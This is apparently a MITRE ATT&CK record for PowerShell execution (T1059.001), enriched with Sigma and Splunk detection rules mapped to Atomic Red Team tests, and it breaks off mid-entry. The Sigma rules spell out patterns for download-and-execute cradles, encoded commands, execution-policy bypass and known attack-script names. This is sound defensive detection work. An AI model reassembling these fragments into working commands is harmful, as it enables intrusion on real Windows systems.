{
    "id": "T1059.001",
    "name": "PowerShell",
    "description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the `Start-Process` cmdlet which can be used to run an executable and the `Invoke-Command` cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\nA number of PowerShell-based offensive testing tools are available, including [Empire](S0363),  [PowerSploit](S0194), [PoshC2](S0378), and PSAttack.(Citation: Github PSAttack)\nPowerShell commands/scripts can also be executed without directly invoking the `powershell.exe` binary through interfaces to PowerShell's underlying `System.Management.Automation` assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
    "platforms": "Windows",
    "kill_chain_phases": "Execution",
    "data_sources": "Command: Command Execution, Module: Module Load, Process: Process Creation, Script: Script Execution",
    "detection": "If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\nMonitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.",
    "url": "https://attack.mitre.org/techniques/T1059/001",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1059.001",
                "atomic_attack_guid": "4099086c-1470-4223-8085-8186e1ed5948",
                "atomic_attack_name": "SOAPHound - Build Cache",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "HackTool - SOAPHound Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_soaphound_execution.yml",
                        "remote_content": "title: HackTool - SOAPHound Execution\nid: e92a4287-e072-4a40-9739-370c106bb750\nstatus: test\ndescription: |\n    Detects the execution of SOAPHound, a .NET tool for collecting Active Directory data, using specific command-line arguments that may indicate an attempt to extract sensitive AD information.\nreferences:\n    - https://github.com/FalconForceTeam/SOAPHound\n    - https://medium.com/falconforce/soaphound-tool-to-collect-active-directory-data-via-adws-165aca78288c\nauthor: '@kostastsale'\ndate: 2024-01-26\ntags:\n    - attack.discovery\n    - attack.t1087\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_1:\n        CommandLine|contains:\n            - ' --buildcache '\n            - ' --bhdump '\n            - ' --certdump '\n            - ' --dnsdump '\n    selection_2:\n        CommandLine|contains:\n            - ' -c '\n            - ' --cachefilename '\n            - ' -o '\n            - ' --outputdirectory'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Windows SOAPHound Binary Execution",
                        "rule_link": "https://research.splunk.com/endpoint/8e53f839-e127-4d6d-a54d-a2f67044a57f/"
                    },
                    {
                        "rule_name": "User Discovery With Env Vars PowerShell",
                        "rule_link": "https://research.splunk.com/endpoint/0cdf318b-a0dd-47d7-b257-c621c0247de8/"
                    }
                ]
            },
            {
                "tech_id": "T1059.001",
                "atomic_attack_guid": "6a5b2a50-d037-4879-bf01-43d4d6cbf73f",
                "atomic_attack_name": "SOAPHound - Dump BloodHound Data",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "HackTool - SOAPHound Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_soaphound_execution.yml",
                        "remote_content": "title: HackTool - SOAPHound Execution\nid: e92a4287-e072-4a40-9739-370c106bb750\nstatus: test\ndescription: |\n    Detects the execution of SOAPHound, a .NET tool for collecting Active Directory data, using specific command-line arguments that may indicate an attempt to extract sensitive AD information.\nreferences:\n    - https://github.com/FalconForceTeam/SOAPHound\n    - https://medium.com/falconforce/soaphound-tool-to-collect-active-directory-data-via-adws-165aca78288c\nauthor: '@kostastsale'\ndate: 2024-01-26\ntags:\n    - attack.discovery\n    - attack.t1087\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_1:\n        CommandLine|contains:\n            - ' --buildcache '\n            - ' --bhdump '\n            - ' --certdump '\n            - ' --dnsdump '\n    selection_2:\n        CommandLine|contains:\n            - ' -c '\n            - ' --cachefilename '\n            - ' -o '\n            - ' --outputdirectory'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Windows SOAPHound Binary Execution",
                        "rule_link": "https://research.splunk.com/endpoint/8e53f839-e127-4d6d-a54d-a2f67044a57f/"
                    },
                    {
                        "rule_name": "User Discovery With Env Vars PowerShell",
                        "rule_link": "https://research.splunk.com/endpoint/0cdf318b-a0dd-47d7-b257-c621c0247de8/"
                    }
                ]
            },
            {
                "tech_id": "T1059.001",
                "atomic_attack_guid": "0d181431-ddf3-4826-8055-2dbf63ae848b",
                "atomic_attack_name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious Execution of Powershell with Base64",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_encode.yml",
                        "remote_content": "title: Suspicious Execution of Powershell with Base64\nid: fb843269-508c-4b76-8b8d-88679db22ce7\nstatus: test\ndescription: Commandline to launch powershell with a base64 payload\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets\n    - https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/\n    - https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/\nauthor: frack113\ndate: 2022-01-02\nmodified: 2023-01-05\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - \\powershell.exe\n            - \\pwsh.exe\n        CommandLine|contains:\n            - ' -e '\n            - ' -en '\n            - ' -enc '\n            - ' -enco'\n            - ' -ec '\n    filter_encoding:\n        CommandLine|contains: ' -Encoding '\n    filter_azure:\n        ParentImage|contains:\n            - 'C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\'\n            - '\\gc_worker.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Malicious PowerShell Process - Execution Policy Bypass",
                        "rule_link": "https://research.splunk.com/endpoint/9be56c82-b1cc-4318-87eb-d138afaaca39/"
                    }
                ]
            },
            {
                "tech_id": "T1059.001",
                "atomic_attack_guid": "86a43bad-12e3-4e85-b97c-4d5cf25b95c3",
                "atomic_attack_name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious Execution of Powershell with Base64",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_encode.yml",
                        "remote_content": "title: Suspicious Execution of Powershell with Base64\nid: fb843269-508c-4b76-8b8d-88679db22ce7\nstatus: test\ndescription: Commandline to launch powershell with a base64 payload\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets\n    - https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/\n    - https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/\nauthor: frack113\ndate: 2022-01-02\nmodified: 2023-01-05\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - \\powershell.exe\n            - \\pwsh.exe\n        CommandLine|contains:\n            - ' -e '\n            - ' -en '\n            - ' -enc '\n            - ' -enco'\n            - ' -ec '\n    filter_encoding:\n        CommandLine|contains: ' -Encoding '\n    filter_azure:\n        ParentImage|contains:\n            - 'C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\'\n            - '\\gc_worker.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Malicious PowerShell Process - Execution Policy Bypass",
                        "rule_link": "https://research.splunk.com/endpoint/9be56c82-b1cc-4318-87eb-d138afaaca39/"
                    }
                ]
            },
            {
                "tech_id": "T1059.001",
                "atomic_attack_guid": "1c0a870f-dc74-49cf-9afc-eccc45e58790",
                "atomic_attack_name": "ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious Execution of Powershell with Base64",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_encode.yml",
                        "remote_content": "title: Suspicious Execution of Powershell with Base64\nid: fb843269-508c-4b76-8b8d-88679db22ce7\nstatus: test\ndescription: Commandline to launch powershell with a base64 payload\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets\n    - https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/\n    - https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/\nauthor: frack113\ndate: 2022-01-02\nmodified: 2023-01-05\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - \\powershell.exe\n            - \\pwsh.exe\n        CommandLine|contains:\n            - ' -e '\n            - ' -en '\n            - ' -enc '\n            - ' -enco'\n            - ' -ec '\n    filter_encoding:\n        CommandLine|contains: ' -Encoding '\n    filter_azure:\n        ParentImage|contains:\n            - 'C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\'\n            - '\\gc_worker.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Malicious PowerShell Process - Execution Policy Bypass",
                        "rule_link": "https://research.splunk.com/endpoint/9be56c82-b1cc-4318-87eb-d138afaaca39/"
                    }
                ]
            },
            {
                "tech_id": "T1059.001",
                "atomic_attack_guid": "686a9785-f99b-41d4-90df-66ed515f81d7",
                "atomic_attack_name": "ATHPowerShellCommandLineParameter -Command parameter variations",
                "platform": "Windows",
                "splunk_rules": [
                    {
                        "rule_name": "Malicious PowerShell Process - Execution Policy Bypass",
                        "rule_link": "https://research.splunk.com/endpoint/9be56c82-b1cc-4318-87eb-d138afaaca39/"
                    }
                ]
            },
            {
                "tech_id": "T1059.001",
                "atomic_attack_guid": "8a2ad40b-12c7-4b25-8521-2737b0a415af",
                "atomic_attack_name": "Powershell invoke mshta.exe download",
                "platform": "Windows",
                "splunk_rules": [
                    {
                        "rule_name": "CMD Carry Out String Command Parameter",
                        "rule_link": "https://research.splunk.com/endpoint/54a6ed00-3256-11ec-b031-acde48001122/"
                    }
                ]
            },
            {
                "tech_id": "T1059.001",
                "atomic_attack_guid": "388a7340-dbc1-4c9d-8e59-b75ad8c6d5da",
                "atomic_attack_name": "Powershell MsXml COM object - with prompt",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious PowerShell IEX Execution Patterns",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_iex_patterns.yml",
                        "remote_content": "title: Suspicious PowerShell IEX Execution Patterns\nid: 09576804-7a05-458e-a817-eb718ca91f54\nstatus: test\ndescription: Detects suspicious ways to run Invoke-Execution using IEX alias\nreferences:\n    - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2\n    - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-03-24\nmodified: 2022-11-28\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_combined_1:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - ' | iex;'\n            - ' | iex '\n            - ' | iex}'\n            - ' | IEX ;'\n            - ' | IEX -Error'\n            - ' | IEX (new'\n            - ');IEX '\n    selection_combined_2:\n        CommandLine|contains:\n            - '::FromBase64String'\n            - '.GetString([System.Convert]::'\n    selection_standalone:\n        CommandLine|contains:\n            - ')|iex;$'\n            - ');iex($'\n            - ');iex $'\n            - ' | IEX | '\n            - ' | iex\\\"'\n    condition: all of selection_combined_* or selection_standalone\nfalsepositives:\n    - Legitimate scripts that use IEX\nlevel: high\n"
                    },
                    {
                        "rule_name": "Suspicious PowerShell Parameter Substring",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_susp_parameter_variation.yml",
                        "remote_content": "title: Suspicious PowerShell Parameter Substring\nid: 36210e0d-5b19-485d-a087-c096088885f0\nstatus: test\ndescription: Detects suspicious PowerShell invocation with a parameter substring\nreferences:\n    - http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier\nauthor: Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)\ndate: 2019-01-16\nmodified: 2022-07-14\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - ' -windowstyle h '\n            - ' -windowstyl h'\n            - ' -windowsty h'\n            - ' -windowst h'\n            - ' -windows h'\n            - ' -windo h'\n            - ' -wind h'\n            - ' -win h'\n            - ' -wi h'\n            - ' -win h '\n            - ' -win hi '\n            - ' -win hid '\n            - ' -win hidd '\n            - ' -win hidde '\n            - ' -NoPr '\n            - ' -NoPro '\n            - ' -NoProf '\n            - ' -NoProfi '\n            - ' -NoProfil '\n            - ' -nonin '\n            - ' -nonint '\n            - ' -noninte '\n            - ' -noninter '\n            - ' -nonintera '\n            - ' -noninterac '\n            - ' -noninteract '\n            - ' -noninteracti '\n            - ' -noninteractiv '\n            - ' -ec '\n            - ' -encodedComman '\n            - ' -encodedComma '\n            - ' -encodedComm '\n            - ' -encodedCom '\n            - ' -encodedCo '\n            - ' -encodedC '\n            - ' -encoded '\n            - ' -encode '\n            - ' -encod '\n            - ' -enco '\n            - ' -en '\n            - ' -executionpolic '\n            - ' -executionpoli '\n            - ' -executionpol '\n            - ' -executionpo '\n            - ' -executionp '\n            - ' -execution bypass'\n            - ' -executio bypass'\n            - ' -executi bypass'\n            - ' -execut bypass'\n            - ' -execu bypass'\n            - ' -exec bypass'\n            - ' -exe bypass'\n            - ' -ex bypass'\n            - ' -ep bypass'\n            - ' /windowstyle h '\n            - ' /windowstyl h'\n            - ' /windowsty h'\n            - ' /windowst h'\n            - ' /windows h'\n            - ' /windo h'\n            - ' /wind h'\n            - ' /win h'\n            - ' /wi h'\n            - ' /win h '\n            - ' /win hi '\n            - ' /win hid '\n            - ' /win hidd '\n            - ' /win hidde '\n            - ' /NoPr '\n            - ' /NoPro '\n            - ' /NoProf '\n            - ' /NoProfi '\n            - ' /NoProfil '\n            - ' /nonin '\n            - ' /nonint '\n            - ' /noninte '\n            - ' /noninter '\n            - ' /nonintera '\n            - ' /noninterac '\n            - ' /noninteract '\n            - ' /noninteracti '\n            - ' /noninteractiv '\n            - ' /ec '\n            - ' /encodedComman '\n            - ' /encodedComma '\n            - ' /encodedComm '\n            - ' /encodedCom '\n            - ' /encodedCo '\n            - ' /encodedC '\n            - ' /encoded '\n            - ' /encode '\n            - ' /encod '\n            - ' /enco '\n            - ' /en '\n            - ' /executionpolic '\n            - ' /executionpoli '\n            - ' /executionpol '\n            - ' /executionpo '\n            - ' /executionp '\n            - ' /execution bypass'\n            - ' /executio bypass'\n            - ' /executi bypass'\n            - ' /execut bypass'\n            - ' /execu bypass'\n            - ' /exec bypass'\n            - ' /exe bypass'\n            - ' /ex bypass'\n            - ' /ep bypass'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    },
                    {
                        "rule_name": "Change PowerShell Policies to an Insecure Level",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_set_policies_to_unsecure_level.yml",
                        "remote_content": "title: Change PowerShell Policies to an Insecure Level\nid: 87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180\nrelated:\n    - id: cf2e938e-9a3e-4fe8-a347-411642b28a9f # ProcCreation Registry\n      type: similar\n    - id: 61d0475c-173f-4844-86f7-f3eebae1c66b # ScriptBlock\n      type: similar\n    - id: fad91067-08c5-4d1a-8d8c-d96a21b37814 # Registry\n      type: similar\nstatus: test\ndescription: Detects changing the PowerShell script execution policy to a potentially insecure level using the \"-ExecutionPolicy\" flag.\nreferences:\n    - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.4\n    - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.4\n    - https://adsecurity.org/?p=2604\n    - https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/\nauthor: frack113\ndate: 2021-11-01\nmodified: 2023-12-13\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n    selection_option:\n        CommandLine|contains:\n            - '-executionpolicy '\n            - ' -ep '\n            - ' -exec '\n    selection_level:\n        CommandLine|contains:\n            - 'Bypass'\n            - 'Unrestricted'\n    condition: all of selection_*\nfalsepositives:\n    - Administrator scripts\nlevel: medium\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Malicious PowerShell Process - Execution Policy Bypass",
                        "rule_link": "https://research.splunk.com/endpoint/9be56c82-b1cc-4318-87eb-d138afaaca39/"
                    }
                ]
            },
            {
                "tech_id": "T1059.001",
                "atomic_attack_guid": "06a220b6-7e29-4bd8-9d07-5b4d86742372",
                "atomic_attack_name": "Invoke-AppPathBypass",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "PowerShell Download and Execution Cradles",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml",
                        "remote_content": "title: PowerShell Download and Execution Cradles\nid: 85b0b087-eddf-4a2b-b033-d771fa2b9775\nstatus: test\ndescription: Detects PowerShell download and execution cradles.\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-05-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_download:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    selection_iex:\n        CommandLine|contains:\n            - ';iex $'\n            - '| IEX'\n            - '|IEX '\n            - 'I`E`X'\n            - 'I`EX'\n            - 'IE`X'\n            - 'iex '\n            - 'IEX ('\n            - 'IEX('\n            - 'Invoke-Expression'\n    condition: all of selection_*\nfalsepositives:\n    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly\nlevel: high\n"
                    },
                    {
                        "rule_name": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml",
                        "remote_content": "title: Suspicious PowerShell Invocations - Specific - ProcessCreation\nid: 536e2947-3729-478c-9903-745aaffe60d2\nrelated:\n    - id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\n      type: obsolete\n    - id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71\n      type: similar\n    - id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090\n      type: similar\nstatus: test\ndescription: Detects suspicious PowerShell invocation command parameters\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-05\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_convert_b64:\n        CommandLine|contains|all:\n            - '-nop'\n            - ' -w '\n            - 'hidden'\n            - ' -c '\n            - '[Convert]::FromBase64String'\n    selection_iex:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-noni'\n            - '-nop'\n            - ' -c '\n            - 'iex'\n            - 'New-Object'\n    selection_enc:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-ep'\n            - 'bypass'\n            - '-Enc'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'reg'\n            - 'add'\n            - '\\software\\'\n    selection_webclient:\n        CommandLine|contains|all:\n            - 'bypass'\n            - '-noprofile'\n            - '-windowstyle'\n            - 'hidden'\n            - 'new-object'\n            - 'system.net.webclient'\n            - '.download'\n    selection_iex_webclient:\n        CommandLine|contains|all:\n            - 'iex'\n            - 'New-Object'\n            - 'Net.WebClient'\n            - '.Download'\n    filter_chocolatey:\n        CommandLine|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\"\n            - 'Write-ChocolateyWarning'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Suspicious Program Names",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_progname.yml",
                        "remote_content": "title: Suspicious Program Names\nid: efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6\nstatus: test\ndescription: Detects suspicious patterns in program names or folders that are often found in malicious samples or hacktools\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-11\nmodified: 2023-03-22\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_image:\n        - Image|contains:\n              - '\\CVE-202' # Update this when we reach the year 2100\n              - '\\CVE202' # Update this when we reach the year 2100\n        - Image|endswith:\n              - '\\poc.exe'\n              - '\\artifact.exe'\n              - '\\artifact64.exe'\n              - '\\artifact_protected.exe'\n              - '\\artifact32.exe'\n              - '\\artifact32big.exe'\n              - 'obfuscated.exe'\n              - 'obfusc.exe'\n              - '\\meterpreter'\n    selection_commandline:\n        CommandLine|contains:\n            - 'inject.ps1'\n            - 'Invoke-CVE'\n            - 'pupy.ps1'\n            - 'payload.ps1'\n            - 'beacon.ps1'\n            - 'PowerView.ps1'\n            - 'bypass.ps1'\n            - 'obfuscated.ps1'\n            - 'obfusc.ps1'\n            - 'obfus.ps1'\n            - 'obfs.ps1'\n            - 'evil.ps1'\n            - 'MiniDogz.ps1'\n            - '_enc.ps1'\n            - '\\shell.ps1'\n            - '\\rshell.ps1'\n            - 'revshell.ps1'\n            - '\\av.ps1'\n            - '\\av_test.ps1'\n            - 'adrecon.ps1'\n            - 'mimikatz.ps1'\n            - '\\PowerUp_'\n            - 'powerup.ps1'\n            - '\\Temp\\a.ps1'\n            - '\\Temp\\p.ps1'\n            - '\\Temp\\1.ps1'\n            - 'Hound.ps1'\n            - 'encode.ps1'\n            - 'powercat.ps1'\n    condition: 1 of selection*\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - CurrentDirectory\nfalsepositives:\n    - Legitimate tools that accidentally match on the searched patterns\nlevel: high\n"
                    },
                    {
                        "rule_name": "Suspicious PowerShell Download and Execute Pattern",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_susp_download_patterns.yml",
                        "remote_content": "title: Suspicious PowerShell Download and Execute Pattern\nid: e6c54d94-498c-4562-a37c-b469d8e9a275\nrelated:\n    - id: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\n      type: derived\nstatus: test\ndescription: Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)\nreferences:\n    - https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70\n    - https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-28\nmodified: 2022-03-01\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: # make sure that your backend applies the strings case-insensitive\n            - 'IEX ((New-Object Net.WebClient).DownloadString'\n            - 'IEX (New-Object Net.WebClient).DownloadString'\n            - 'IEX((New-Object Net.WebClient).DownloadString'\n            - 'IEX(New-Object Net.WebClient).DownloadString'\n            - ' -command (New-Object System.Net.WebClient).DownloadFile('\n            - ' -c (New-Object System.Net.WebClient).DownloadFile('\n    condition: selection\nfalsepositives:\n    - Software installers that pull packages from remote systems and execute them\nlevel: high\n"
                    },
                    {
                        "rule_name": "PowerShell Web Download",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
                    },
                    {
                        "rule_name": "PowerShell Download Pattern",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml",
                        "remote_content": "title: PowerShell Download Pattern\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nrelated:\n    - id: e6c54d94-498c-4562-a37c-b469d8e9a275\n      type: derived\nstatus: test\ndescription: Detects a Powershell process that contains download commands in its command line string\nreferences:\n    - https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html\n    - https://lab52.io/blog/winter-vivern-all-summer/\n    - https://hatching.io/blog/powershell-analysis/\nauthor: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019-01-16\nmodified: 2023-01-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'new-object'\n            - 'net.webclient).'\n            - 'download'\n        CommandLine|contains:\n            - 'string('\n            - 'file('\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
